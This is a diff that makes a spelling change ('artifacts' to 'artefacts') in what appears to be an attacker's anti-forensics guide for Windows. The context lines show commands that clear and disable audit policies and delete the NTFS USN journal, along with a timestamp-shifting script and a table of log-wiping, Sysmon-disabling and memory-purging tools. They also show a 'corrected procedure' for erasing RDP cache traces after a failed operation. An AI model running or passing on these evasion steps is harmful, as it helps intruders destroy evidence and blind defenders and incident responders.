@@ -24,7 +24,7 @@ auditpol /clear /y
 auditpol /set /category:"Object Access","Account Logon" /success:disable /failure:disable
 ```
 
-#### USN Journal wiping (NTFS artifacts)
+#### USN Journal wiping (NTFS artefacts)
 
 ```powershell
 fsutil usn deletejournal /D C:  # Destroys file change records
@@ -68,7 +68,7 @@ python3 mft_editor.py --target C:\ --timedelta="-7d"  # Shift all timestamps
 | Slackercleaner	 | Multi-platform log wiping	Moderate      | (known IOCs)                 |
 | Timestomp-NG	   | Nanosecond-precision timestamp forgery	 | Low                          |
 | SysmonKiller	   | Disables Sysmon via driver unload	      | High (requires admin)        |
-| MemPurge	       | Wipes RAM artifacts pre-reboot	         | Critical (must be last step) |
+| MemPurge	       | Wipes RAM artefacts pre-reboot	         | Critical (must be last step) |
 
 Chain tools with living-off-the-land binaries:
 
@@ -88,7 +88,7 @@ Operation "Midnight Sun" Failure Points:
 Corrected 2025 Procedure:
 
 ```powershell
-# Full artifact sterilization
+# Full artefact sterilization
 Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache\*" -Force
 Cleanmgr /sagerun:6174  # Disk Cleanup silent mode
 ```
